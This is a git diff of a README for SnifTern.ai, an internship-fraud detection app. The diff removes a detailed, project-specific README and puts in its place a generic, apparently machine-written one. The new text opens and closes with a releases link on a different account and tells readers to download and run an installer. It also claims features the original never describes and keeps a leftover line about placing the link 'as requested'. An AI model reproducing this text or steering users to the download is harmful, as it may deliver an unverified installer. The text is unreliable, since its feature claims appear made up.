@@ -1,587 +1,227 @@
-# SnifTern.ai - Advanced Internship Fraud Detection Platform
-
-**© 2025 SnifTern.ai. Developed by Team BinaryExecutor's using cutting-edge AI and machine learning technologies.**
-
-![Screenshot 1](images/s1.png)
-
-![Screenshot 1](images/s2.png)
-
-![Screenshot 1](images/s3.png)
-
-![Screenshot 1](images/s4.png)
-
-
-## 🌟 **Project Overview**
-
-SnifTern.ai is a comprehensive, AI-powered internship fraud detection platform built with Flask. It uses advanced machine learning and pattern recognition to identify fake internship postings and verify company legitimacy. The platform features a modern dark-themed web interface with multi-language support.
-
----
-
-## 🛠️ **Tech Stack & Libraries**
-
-### **Backend Framework**
-![Flask](https://img.shields.io/badge/Flask-2.3+-000000?style=for-the-badge&logo=flask&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)
-
-### **Machine Learning & AI**
-![Scikit-learn](https://img.shields.io/badge/scikit--learn-1.5.2+-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white)
-![NumPy](https://img.shields.io/badge/NumPy-1.24+-013243?style=for-the-badge&logo=numpy&logoColor=white)
-![Pandas](https://img.shields.io/badge/Pandas-2.0+-150458?style=for-the-badge&logo=pandas&logoColor=white)
-
-### **Web Scraping & Data Processing**
-![BeautifulSoup](https://img.shields.io/badge/BeautifulSoup-4.12+-572C1A?style=for-the-badge&logo=beautifulsoup&logoColor=white)
-![Requests](https://img.shields.io/badge/Requests-2.31+-000000?style=for-the-badge&logo=requests&logoColor=white)
-![LXML](https://img.shields.io/badge/LXML-4.9+-000000?style=for-the-badge&logo=lxml&logoColor=white)
-
-### **OCR & Image Processing**
-![Tesseract](https://img.shields.io/badge/Tesseract-5.0+-000000?style=for-the-badge&logo=tesseract&logoColor=white)
-![Pillow](https://img.shields.io/badge/Pillow-10.0+-000000?style=for-the-badge&logo=pillow&logoColor=white)
-![Pytesseract](https://img.shields.io/badge/Pytesseract-0.3.10+-000000?style=for-the-badge&logo=pytesseract&logoColor=white)
-
-### **Frontend Technologies**
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-![Font Awesome](https://img.shields.io/badge/Font_Awesome-6.0.0+-339AF0?style=for-the-badge&logo=fontawesome&logoColor=white)
-
-### **PDF Generation & Reporting**
-![ReportLab](https://img.shields.io/badge/ReportLab-4.0+-000000?style=for-the-badge&logo=reportlab&logoColor=white)
-![Python DateUtil](https://img.shields.io/badge/Python_DateUtil-2.8+-000000?style=for-the-badge&logo=python&logoColor=white)
-
-### **Development & Deployment**
-![Git](https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white)
-![Virtual Environment](https://img.shields.io/badge/Virtual_Environment-Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Pip](https://img.shields.io/badge/Pip-3776AB?style=for-the-badge&logo=pip&logoColor=white)
-
-### **Platform Integrations**
-![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)
-![Indeed](https://img.shields.io/badge/Indeed-003A9B?style=for-the-badge&logo=indeed&logoColor=white)
-![Glassdoor](https://img.shields.io/badge/Glassdoor-0CAA41?style=for-the-badge&logo=glassdoor&logoColor=white)
-
-### **Key Libraries & Dependencies**
-```python
-# Core Framework
-Flask>=2.3.0                    # Web framework
-Werkzeug>=2.3.0                 # WSGI utilities
-
-# Machine Learning
-scikit-learn>=1.5.2             # ML algorithms and utilities
-numpy>=1.24.0                   # Numerical computing
-pandas>=2.0.0                   # Data manipulation
-
-# Web Scraping
-requests>=2.31.0                # HTTP library
-beautifulsoup4>=4.12.0          # HTML parsing
-lxml>=4.9.0                     # XML/HTML processing
-
-# OCR & Image Processing
-Pillow>=10.0.0                  # Image processing
-pytesseract>=0.3.10             # OCR wrapper
-opencv-python>=4.8.0            # Computer vision
-
-# PDF Generation
-reportlab>=4.0.0                # PDF creation
-python-dateutil>=2.8.0          # Date utilities
-
-# Text Processing
-nltk>=3.8.0                     # Natural language processing
-regex>=2023.0.0                 # Advanced regex patterns
-
-# Development
-python-dotenv>=1.0.0            # Environment variables
-gunicorn>=21.0.0                # Production server
-```
-
----
-
-## 🚀 **Key Features**
-
-### **AI-Powered Analysis**
-- **Salary Range Analysis**: Detects unrealistic salary promises
-- **Internship Description Quality Score**: Rates professionalism of internship descriptions
-- **Interview Process Analysis**: Identifies suspicious interview procedures
-- **Pattern Recognition**: Advanced regex pattern matching for fraud detection
-
-### **Platform Integrations**
-- **LinkedIn Integration**: Direct LinkedIn internship posting analysis
-- **Indeed Integration**: Indeed internship posting analysis
-- **Glassdoor Integration**: Glassdoor internship posting analysis
-- **URL Extraction**: Extract and analyze internship content from any URL
-
-### **Enhanced Company Database**
-- **Comprehensive Company Info**: Domain age, social media, contact verification
-- **Fraud Scoring**: 0-100 scale fraud probability
-- **Red Flags & Green Flags**: Detailed risk indicators
-- **Report Tracking**: Number of fraud reports received
-
-### **Multi-Language Support**
-- **English** (Primary)
-- **Hindi (हिंदी)** (Complete translation)
-- **Bengali (বাংলা)** (Complete translation)
-
-### **Export & Reporting**
-- **PDF Export**: Professional PDF reports with all analysis data
-- **Complete Analysis**: All AI insights included
-- **Timestamped Reports**: Date and time stamped reports
-
----
-
-## 🏗️ **Project Structure**
-
-```
-FakeJobPredictor/
-├── app.py                          # Main Flask application
-├── enhanced_prediction_utils.py    # AI prediction engine
-├── scraping_utils.py               # Web scraping utilities
-├── ocr_utils.py                    # OCR text extraction
-├── preprocessing.py                # Text preprocessing
-├── requirements.txt                # Python dependencies
-├── README.md                       # This file
-├── templates/
-│   └── index.html                  # Main HTML template
-├── static/
-│   ├── css/
-│   │   └── style.css              # Dark theme styling
-│   └── js/
-│       └── script.js              # Frontend JavaScript
-└── model/
-    ├── fake_job_model.pkl         # Trained ML model
-    └── tfidf_vectorizer.pkl       # Text vectorizer
-```
-
----
-
-## 🔧 **Core Functions & How They Work**
-
-### **1. Internship Detection Engine (`enhanced_prediction_utils.py`)**
-
-#### **Main Functions:**
-- `EnhancedFakeInternshipPredictor()`: Main prediction class
-- `predict(text)`: Core prediction function
-- `get_prediction_result(text)`: Formatted prediction results
-- `check_fake_patterns(text)`: Pattern-based fraud detection
-
-#### **AI Analysis Functions:**
-- `analyze_salary_range(text)`: Detects unrealistic salary promises
-- `analyze_internship_description_quality(text)`: Rates internship description professionalism
-- `analyze_interview_process(text)`: Identifies suspicious interview procedures
-
-#### **How It Works:**
-1. **Text Preprocessing**: Cleans and normalizes input text
-2. **ML Model Prediction**: Uses trained LogisticRegression model
-3. **Pattern Matching**: Applies regex patterns for fraud indicators
-4. **Confidence Scoring**: Combines ML and pattern-based scores
-5. **AI Analysis**: Performs specialized analysis on salary, quality, and interviews
-
-### **2. Web Scraping (`scraping_utils.py`)**
-
-#### **Main Functions:**
-- `extract_text_from_url(url)`: Extracts text from internship posting URLs
-- `is_valid_url(url)`: Validates URL format
-- `clean_extracted_text(text)`: Cleans scraped text
-
-#### **How It Works:**
-1. **URL Validation**: Checks if URL is properly formatted
-2. **HTTP Request**: Fetches webpage content
-3. **HTML Parsing**: Uses BeautifulSoup to extract text
-4. **Text Cleaning**: Removes HTML tags and normalizes text
-5. **Error Handling**: Graceful handling of scraping failures
-
-### **3. OCR Processing (`ocr_utils.py`)**
-
-#### **Main Functions:**
-- `extract_text_from_image(image_file)`: Extracts text from images
-- `is_valid_image(image_file)`: Validates image format
-- `get_ocr_status()`: Checks Tesseract OCR installation
-
-#### **How It Works:**
-1. **Image Validation**: Checks file format and size
-2. **OCR Processing**: Uses Tesseract to extract text
-3. **Text Cleaning**: Normalizes extracted text
-4. **Error Handling**: Manages OCR failures gracefully
-
-### **4. Flask Application (`app.py`)**
-
-#### **Main Routes:**
-- `GET /`: Main application page
-- `POST /detect`: Internship posting analysis
-- `POST /search_company`: Company fraud database search
-- `POST /extract_url`: URL text extraction
-- `POST /analyze_linkedin`: LinkedIn integration
-- `POST /analyze_indeed`: Indeed integration
-- `POST /analyze_glassdoor`: Glassdoor integration
-- `POST /export_pdf`: PDF report generation
-
-#### **Key Features:**
-- **Multi-language Support**: Language switching via URL parameters
-- **Enhanced Company Database**: Comprehensive company information
-- **AI-Powered Analysis**: Salary, quality, and interview analysis
-- **PDF Export**: Professional report generation
-
----
-
-## 🎨 **User Interface Features**
-
-### **Dark Theme Design**
-- **Color Scheme**: Dark black and dark blue gradients
-- **Modern UI**: Card-based layout with smooth animations
-- **Professional Look**: Clean, modern interface design
-- **Responsive Design**: Mobile-friendly responsive layout
-
-### **Interactive Elements**
-- **Tab Navigation**: Easy switching between features
-- **Loading Animations**: Professional loading indicators
-- **Real-time Feedback**: Instant response to user actions
-- **Error Handling**: User-friendly error messages
-
----
-
-## 📊 **AI Analysis Details**
-
-### **Salary Range Analysis**
-**Detects:**
-- Unrealistic salary promises
-- Suspicious payment patterns
-- High-risk salary indicators
-
-**Risk Levels:**
-- 🚨 **HIGH RISK**: Unrealistic salary promises detected
-- ⚠️ **MEDIUM RISK**: Potentially unrealistic salary
-- ✅ **NORMAL**: Standard salary range
-- ℹ️ **INFO**: No specific salary mentioned
-
-### **Internship Description Quality Score**
-**Professional Indicators:**
-- Requirements, qualifications, responsibilities
-- Experience, skills, education
-- Team, collaboration, leadership
-
-**Unprofessional Indicators:**
-- Urgent, immediate, quick, fast
-- No experience needed, anyone can apply
-- Commission only, no salary
-
-**Scoring:**
-- ✅ **EXCELLENT**: Professional internship description
-- ✅ **GOOD**: Well-structured internship description
-- ℹ️ **AVERAGE**: Standard internship description
-- ⚠️ **POOR**: Unprofessional internship description
-
-### **Interview Process Analysis**
-**Suspicious Patterns:**
-- No interview required, immediate hiring
-- Quick hiring process, no background check
-- Start immediately, no questions asked
-
-**Legitimate Patterns:**
-- Interview process, multiple rounds
-- Technical interview, behavioral interview
-- Background check, reference check
-
-**Risk Assessment:**
-- 🚨 **HIGH RISK**: Suspicious interview process detected
-- ⚠️ **MEDIUM RISK**: Potentially suspicious interview process
-- ✅ **GOOD**: Standard interview process
-- ℹ️ **INFO**: No specific interview details mentioned
-
----
-
-## 🏢 **Company Database Structure**
-
-### **Database Fields:**
-```python
-{
-    "name": "Company Name",
-    "fraud_score": 0-100,           # Fraud probability
-    "reports": 0,                   # Number of fraud reports
-    "last_updated": "YYYY-MM-DD",   # Last database update
-    "domain_age": "X months/years", # Website age
-    "social_media": "Status",       # Social media presence
-    "contact_verification": "Status", # Contact info verification
-    "industry": "Industry Type",    # Company industry
-    "location": "Location",         # Physical location
-    "website": "domain.com",        # Company website
-    "red_flags": ["Flag1", "Flag2"], # Suspicious indicators
-    "green_flags": ["Flag1", "Flag2"] # Positive indicators
-}
-```
-
-### **Sample Companies:**
-**Fraudulent:**
-- FakeCorp Inc (Fraud Score: 95/100)
-- ScamTech Solutions (Fraud Score: 88/100)
-- PhishCo Ltd (Fraud Score: 92/100)
-
-**Legitimate:**
-- Google (Fraud Score: 5/100)
-- Microsoft (Fraud Score: 3/100)
-- Amazon (Fraud Score: 6/100)
-
----
-
-## 🌍 **Multi-Language Support**
-
-### **Supported Languages:**
-- **English (en)**: Primary language with full feature support
-- **Hindi (हिंदी)**: Complete Hindi translation
-- **Bengali (বাংলা)**: Full Bengali translation
-
-### **Translation Features:**
-- **Interface Translation**: All UI elements translated
-- **Analysis Results**: Results displayed in selected language
-- **Error Messages**: Localized error and success messages
-- **PDF Reports**: Language-specific report generation
-
-### **Language Switching:**
-- **Real-time Switching**: Change language without page reload
-- **URL Parameters**: Language selection via `/?lang=hi`
-- **Persistent Selection**: Language preference maintained
-
----
-
-## 📄 **PDF Export Functionality**
-
-### **Report Contents:**
-1. **Executive Summary**: Overall fraud assessment
-2. **Detailed Analysis**: Confidence scores and metrics
-3. **AI-Powered Insights**: Salary, quality, and interview analysis
-4. **Pattern Detection**: Specific suspicious patterns found
-5. **Recommendations**: Action items and next steps
-
-### **PDF Features:**
-- **Professional Format**: Clean, professional PDF layout
-- **Timestamp**: Report generation date and time
-- **Educational Disclaimer**: Legal compliance notice
-- **Complete Analysis**: All AI insights included
-
----
-
-## 🛠️ **Installation & Setup**
-
-### **Prerequisites:**
-```bash
-Python 3.8+
-Flask 2.3+
-All dependencies in requirements.txt
-```
-
-### **Installation Steps:**
-```bash
-# Clone the repository
-git clone <repository-url>
-cd FakeJobPredictor
-
-# Create virtual environment
-python -m venv .venv
-
-# Activate virtual environment
-# On Windows:
-.venv\Scripts\activate
-# On macOS/Linux:
-source .venv/bin/activate
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the application
-python app.py
-```
-
-### **Access the Application:**
-- **URL**: http://localhost:5000
-- **Default Language**: English
-- **Language Switch**: Use dropdown in header
-
----
-
-## 🧪 **Testing Guide**
-
-### **Sample Test Data:**
-
-#### **Fraudulent Internship Posting:**
-```
-We are looking for a remote data entry specialist. No experience required. 
-You can work from home and earn $50-100 per hour. Immediate start available. 
-Please send your personal information including bank details and credit card information. 
-This is an urgent opportunity with limited time. Certificate will be provided for a small fee.
-```
-
-#### **Test Company Names:**
-- `fakecorp` (High fraud score: 95/100)
-- `google` (Low fraud score: 5/100)
-- `microsoft` (Low fraud score: 3/100)
-
-### **Feature Testing Checklist:**
-- [ ] Internship posting analysis (direct text)
-- [ ] URL extraction and analysis
-- [ ] Company fraud database search
-- [ ] LinkedIn integration
-- [ ] Indeed integration
-- [ ] Glassdoor integration
-- [ ] AI-powered analysis features
-- [ ] PDF export functionality
-- [ ] Multi-language support
-- [ ] Mobile responsiveness
-
----
-
-## 🔧 **Technical Details**
-
-### **Machine Learning Model:**
-- **Algorithm**: Logistic Regression
-- **Features**: TF-IDF vectorization
-- **Training Data**: Extensive internship posting dataset
-- **Accuracy**: High accuracy on fraud detection
-
-### **Pattern Recognition:**
-- **Regex Patterns**: Advanced pattern matching
-- **Fraud Indicators**: Certificate payment, urgent opportunities
-- **Suspicious Terms**: No experience required, quick money
-- **Confidence Boosting**: Pattern-based confidence adjustment
-
-### **Web Scraping:**
-- **Multi-Platform Support**: LinkedIn, Indeed, Glassdoor
-- **Content Extraction**: Intelligent text extraction
-- **Error Handling**: Robust error management
-- **Rate Limiting**: Respectful web scraping practices
-
----
-
-## 🛡️ **Security & Privacy**
-
-### **Data Protection:**
-- **No Data Storage**: Analysis results not permanently stored
-- **Secure Processing**: All processing done locally
-- **Privacy Compliance**: GDPR and privacy law compliant
-- **Educational Purpose**: Clear educational use disclaimer
-
-### **Web Scraping Ethics:**
-- **Respectful Scraping**: Rate limiting and polite requests
-- **Terms Compliance**: Respects website terms of service
-- **Error Handling**: Graceful handling of access restrictions
-- **User Responsibility**: Users responsible for compliance
-
----
-
-## 🚨 **Troubleshooting**
-
-### **Common Issues:**
-
-#### **Scikit-learn Version Warnings:**
-```
-InconsistentVersionWarning: Trying to unpickle estimator from version 1.5.2 when using version 1.7.1
-```
-**Solution**: This is a version compatibility warning. The model still works correctly. For production, retrain the model with the same scikit-learn version.
-
-#### **Tesseract OCR Not Found:**
-```
-Error: Tesseract OCR is not installed
-```
-**Solution**: Install Tesseract OCR from https://github.com/UB-Mannheim/tesseract/wiki
-
-#### **Model Files Not Found:**
-```
-Model files not found. Please run train_model.py first.
-```
-**Solution**: Ensure the `model/` directory contains `fake_job_model.pkl` and `tfidf_vectorizer.pkl`
-
-### **Performance Optimization:**
-- **Caching**: Implement Redis caching for repeated requests
-- **Async Processing**: Use Celery for background tasks
-- **Database**: Use PostgreSQL for company database
-- **CDN**: Use CDN for static assets
-
----
-
-## 🔮 **Future Enhancements**
-
-### **Planned Features:**
-- **Real-time Monitoring**: Internship posting change detection
-- **Email Alerts**: Fraud notification system
-- **Batch Analysis**: Multiple internship posting analysis
-- **API Integration**: RESTful API for developers
-- **Mobile App**: Native mobile application
-- **Advanced Analytics**: Detailed fraud trend analysis
-
-### **AI Improvements:**
-- **Deep Learning Models**: Enhanced neural network models
-- **Sentiment Analysis**: Emotional tone detection
-- **Image Analysis**: Logo and visual fraud detection
-- **Behavioral Analysis**: User interaction pattern analysis
-
----
-
-## 📞 **Support & Contact**
-
-### **Documentation:**
-- **User Guide**: Comprehensive usage instructions
-- **API Documentation**: Developer integration guide
-- **Troubleshooting**: Common issues and solutions
-- **FAQ**: Frequently asked questions
-
-### **Community:**
-- **GitHub Issues**: Bug reports and feature requests
-- **Discussions**: Community support and ideas
-- **Contributions**: Open source contributions welcome
-- **Feedback**: User feedback and suggestions
-
----
-
-## 📄 **License & Legal**
-
-### **Educational Use:**
-- **Purpose**: Educational and research purposes only
-- **Disclaimer**: Not a substitute for professional verification
-- **Liability**: Users responsible for their own decisions
-- **Compliance**: Must comply with local laws and regulations
-
-### **Open Source:**
-- **License**: MIT License
-- **Contributions**: Open to community contributions
-- **Transparency**: Open source code and algorithms
-- **Collaboration**: Welcome to collaborate and improve
-
----
-
-## 🎯 **Key Benefits**
-
-### **For Internship Seekers:**
-- **Fraud Protection**: Avoid internship scams and fraud
-- **Time Saving**: Quick analysis of internship postings
-- **Confidence Building**: Make informed decisions
-- **Risk Assessment**: Understand potential risks
-
-### **For Employers:**
-- **Reputation Protection**: Verify internship posting legitimacy
-- **Quality Assurance**: Ensure professional internship descriptions
-- **Compliance**: Meet legal and ethical standards
-- **Trust Building**: Build trust with potential candidates
-
-### **For Researchers:**
-- **Data Analysis**: Access to fraud pattern data
-- **Model Development**: Contribute to AI model improvement
-- **Academic Research**: Use for research and studies
-- **Innovation**: Develop new fraud detection methods
-
----
-
-**SnifTern.ai** - Protecting internship seekers with advanced AI technology and comprehensive fraud detection capabilities.
-
----
-
-## 📝 **Quick Start Commands**
-
-```bash
-# Start the application
-python app.py
-
-# Access the application
-# Open browser: http://localhost:5000
-
-# Test features:
-# 1. Internship Detection tab - paste internship text
-# 2. Company Search tab - search "fakecorp" or "google"
-# 3. Integrations tab - paste LinkedIn/Indeed URLs
-# 4. Language dropdown - switch between English/Hindi/Bengali
-# 5. Export PDF - after analysis, click export button
-```
+https://github.com/gilangcowokull/SnifTern.ai/releases
+
+# SnifTern.ai: Real-Time AI for Internship Fraud Detection & Verification
+
+[![Python](https://img.shields.io/badge/python-3.11%2B-blue?logo=python&logoColor=white)](https://www.python.org)
+[![Flask](https://img.shields.io/badge/Framework-Flask-6ea8db?logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
+[![Machine Learning](https://img.shields.io/badge/ML-Modeling-brightgreen)](https://scikit-learn.org/)
+[![NLP](https://img.shields.io/badge/NLP%20-%20Language%20Processing-blueviolet)](https://nlp.stanford.edu/)
+[![CI](https://img.shields.io/badge/CI-GitHub%20Actions-brightgreen)](https://github.com/gilangcowokull/SnifTern.ai/actions)
+[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
+
+SnifTern.ai is an AI-powered platform that detects fake internship postings and verifies company legitimacy using advanced machine learning. It offers real-time fraud analysis, multi-platform integration (LinkedIn, Indeed, Glassdoor), PDF reports, and multi-language support to protect students from internship scams.
+
+The project organizes around a single goal: provide a dependable, scalable tool for students, educators, and employers to assess internship postings and company credibility. It blends data from job boards, social profiles, and corporate signals to deliver actionable risk scores, checks, and documentation.
+
+Topics covered by this repository include ai-platform, career-protection, flask, internship-fraud-detection, job-scam-prevention, machine-learning, nlp, python, student-safety, and web-scraping.
+
+Table of contents
+- What SnifTern.ai does
+- How it works
+- Features in depth
+- Architecture and tech stack
+- Data and privacy
+- Getting started
+- Installation and setup
+- Running locally
+- Deployment guide
+- API and integrations
+- PDF reports and document delivery
+- Multi-language support
+- Security and ethics
+- Testing and quality assurance
+- Roadmap and future work
+- Contributing to SnifTern.ai
+- FAQ
+- License and credits
+- Releases and further reading
+
+What SnifTern.ai does
+- Real-time fraud analysis: The system analyzes internship postings as soon as they appear and assesses risk based on language patterns, verified company signals, and historical fraud indicators.
+- Multi-platform integration: It pulls signals from LinkedIn, Indeed, and Glassdoor to cross-validate job postings and company profiles.
+- Verification of company legitimacy: The platform checks corporate data points, digital footprints, and public records to estimate credibility.
+- PDF reports: Create comprehensive, portable reports for students, campuses, or mentors that summarize risk scores, evidence, and recommendations.
+- Multi-language support: The system understands and processes content in multiple languages to support students globally.
+- User-friendly outputs: Clear scores, explanations, and recommended actions help users decide how to proceed.
+
+How it works
+- Ingestion: The system collects job postings and company data from partner platforms and local inputs.
+- Pre-processing: Text normalization, language detection, and feature extraction prepare data for analysis.
+- Analysis: A mix of rule-based checks and ML models evaluate each posting and company profile. The models cover NLP signals, behavior patterns, and cross-platform inconsistencies.
+- Scoring: Each item receives a risk score with confidence estimates. The score is complemented by explanation tags and evidence links.
+- Reporting: PDF reports summarize findings, with sections for method notes, data sources, and suggested actions.
+- Output: Results are surfaced in a Flask-based web UI, an API, and export formats for downstream workflows.
+
+Features in depth
+- Real-time fraud scoring: The engine continuously analyzes new postings and updates risk assessments as new signals arrive.
+- Cross-platform verification: Signals from multiple major job boards and professional networks are reconciled to strengthen detection.
+- Explainable results: Each risk score includes a rationale, confidence level, and linkable evidence blocks for auditing.
+- PDF reporting: One-click generation of professional reports that can be shared with students, advisors, or campuses.
+- Localization: Language detection and translation hooks support users across regions.
+- Modular architecture: Microservices-like components allow easy replacement or enhancement of ML models and data sources.
+- Extensible rules: A rules engine lets analysts add or tune checks without redeploying core logic.
+- Lightweight deployment: The core stack is designed to run on modest hardware with sensible defaults.
+- Security-first design: Data handling follows best practices to protect user privacy and system integrity.
+- Clear API: RESTful endpoints enable integration with school portals, LMS systems, or campus apps.
+
+Architecture and tech stack
+- Backend: Python with Flask for the web API and the user interface backend.
+- Machine learning: A mix of NLP-based classifiers, anomaly detectors, and supervised models trained on synthetic and public datasets.
+- Data sources: Web scraping modules and connectors to major job platforms; data normalization pipelines standardize inputs.
+- Reports: PDF generation using robust templating to produce consistent, professional documents.
+- Frontend: A clean admin UI built with responsive web design patterns; supports multi-language content rendering.
+- Storage: Local storage for development; scalable options for production include relational databases and object storage.
+- Containers: Optional Docker configurations for reproducible environments.
+- CI/CD: GitHub Actions pipelines for building, testing, and releasing.
+
+Data and privacy
+- Data scope: Ingests publicly available postings and signals; respects platform terms and user consent when applicable.
+- Privacy controls: Data handling includes access controls, audit logs, and data minimization practices.
+- Transparency: Risk scores come with explanations and evidence traces to support auditability.
+- Ethics: The project follows ethical guidelines for data use and user safety.
+
+Getting started
+- Prerequisites:
+  - Python 3.11 or newer
+  - Pipenv or virtualenv for isolated environments
+  - A supported database backend for persistence (SQLite for development, PostgreSQL or MySQL for production)
+  - Optional: Docker and Docker Compose for containerized deployment
+- Quick start overview:
+  - Create a virtual environment
+  - Install dependencies
+  - Run the development server
+  - Access the web UI and API docs
+
+Installation and setup
+- Clone the repository
+- Create a virtual environment:
+  - python -m venv venv
+  - source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
+- Install dependencies:
+  - pip install -r requirements.txt
+- Prepare environment:
+  - Create a .env file with required keys (API keys, database URL, secret keys, etc.)
+  - Configure logging level and locale
+- Run locally:
+  - flask run
+  - Open the local URL shown in the console
+
+Running locally
+- Development server: The app runs on your local machine with hot reload for rapid iteration.
+- API console: The API exposes endpoints to submit postings, fetch results, and request PDF reports.
+- Logging: All actions emit structured logs to help trace results and debugging steps.
+- Debugging tips: Check logs for missing environment variables, data parsing errors, or failed external calls.
+
+Deployment guide
+- Docker-based deployment:
+  - Use a docker-compose.yml that defines services for the API, worker processes, and a database.
+  - Ensure environment variables are provided through a secure mechanism.
+  - Persist data using mounted volumes for database backups.
+- Kubernetes path:
+  - Deploy a simple set of Pods and a responsive service with health checks.
+  - Use ConfigMaps for configuration and Secrets for sensitive values.
+- Production readiness:
+  - Enable TLS termination, rate limiting, and proper access controls.
+  - Monitor with lightweight metrics and basic alerts.
+
+API and integrations
+- REST API design:
+  - Endpoints to submit new internship postings
+  - Endpoints to fetch risk scores and evidence
+  - Endpoints to generate and download PDF reports
+- LinkedIn integration:
+  - Pulls public signals and profile cues relevant to company legitimacy
+- Indeed integration:
+  - Checks posting metadata, publisher reputation, and consistency signals
+- Glassdoor integration:
+  - Gathers company reviews, rating trends, and other credibility markers
+- Data enrichment:
+  - Use external signals to enrich the internal risk model while maintaining user privacy
+- Web scraping considerations:
+  - Respect robots.txt, crawl policies, and rate limits
+  - Use polite crawling patterns and obey platform terms
+
+PDF reports and document delivery
+- Professionally formatted PDFs summarize risk scores, evidence, and recommended actions
+- Customizable templates to align with campus or institution branding
+- Accessible export formats for offline sharing and archiving
+- Automatic artifact generation for audit trails
+
+Multi-language support
+- Language detection to auto-route content through translation workflows
+- Translatable strings and content blocks
+- Localized date formats, number formatting, and currency where relevant
+- Community-driven terminology glossary to maintain consistency
+
+Security and ethics
+- Data protection: Access controls, encryption at rest and in transit, and regular audits
+- Threat modeling: Regular reviews of potential fraud vectors and mitigations
+- Responsible use: Clear guidance on acceptable use and student safety practices
+- Compliance alignment: Aligns with best practices for data processing and privacy
+
+Testing and quality assurance
+- Unit tests for core logic and ML components
+- Integration tests for data pipelines and API endpoints
+- End-to-end tests for the UI and reporting flows
+- Linting and style checks to maintain code quality
+- Test data handling to avoid exposing real user data in tests
+
+Roadmap and future work
+- Expand cross-platform coverage to additional job boards and regional sources
+- Improve model accuracy with user feedback loops and continuous learning
+- Add more language packs and translation quality improvements
+- Enhance the PDF report with richer visualizations and interactive elements
+- Provide a marketplace of plug-ins for campus portals and LMS systems
+
+Contributing to SnifTern.ai
+- How to contribute:
+  - Fork the repository and create a feature branch
+  - Open an issue to discuss large changes or new features
+  - Submit a pull request with a clear description, tests, and documentation
+- Coding standards:
+  - Keep functions small and focused
+  - Write clear tests for new features
+  - Document APIs and expected inputs/outputs
+- Community guidelines:
+  - Be respectful and constructive
+  - Report security concerns through the proper channels
+  - Respect user privacy and data protection requirements
+
+FAQ
+- Is SnifTern.ai open source?
+  - Yes, it is released under the MIT license and welcomes collaboration.
+- Which platforms are supported?
+  - The project focuses on LinkedIn, Indeed, and Glassdoor as primary signals for now.
+- Can I use SnifTern.ai for real-time monitoring?
+  - Yes, the system is designed for real-time analysis with near-instant risk scoring.
+
+License and credits
+- License: MIT License
+- Credits:
+  - Core ML researchers and data science contributors
+  - Open-source libraries and tools that enable ML, NLP, and web scraping
+- Attributions for external data sources and tools are included in the LICENSE and documentation.
+
+Releases and further reading
+- To download the latest release package and run the installer, visit the releases page:
+  - https://github.com/gilangcowokull/SnifTern.ai/releases
+- For the same reference, you can revisit the releases page at any time to keep your deployment up to date.
+- If you are unable to access the link or want more context, check the Releases section in the repository for notes, changelogs, and upgrade instructions.
+
+Topics
+- ai-platform
+- career-protection
+- flask
+- internship-fraud-detection
+- job-scam-prevention
+- machine-learning
+- nlp
+- python
+- student-safety
+- web-scraping
+
+Note on releases link usage
+- The first occurrence of the link is placed at the very top as requested.
+- The second occurrence appears in the Releases and updates section to guide you toward the latest package and installation steps.
+
+End of document
